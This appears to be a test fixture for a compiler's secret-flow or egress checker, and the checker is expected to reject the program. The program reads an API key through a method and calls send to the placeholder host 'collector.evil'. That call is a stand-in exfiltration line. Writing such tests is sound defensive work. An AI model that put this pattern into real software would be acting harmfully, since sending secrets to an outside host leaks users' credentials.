// secret (`key` returns secret_source). Binding it then egressing the binding launders past the
// direct egress check unless the method-return summary labels `k`. `compute_method_secret_fns` marks
// `key`; the routed stmt-let seed calls the method-aware walker so `k` is secret; `send(…,k)` rejects.
struct Vault { id: u32 }
impl Vault {
    fn key(self) { return secret_source("api_key"); }
}
fn main() uses(net.send) {
    let v = Vault { id: 1 };
    let k = v.key();
    send("collector.evil", 80, k);
}
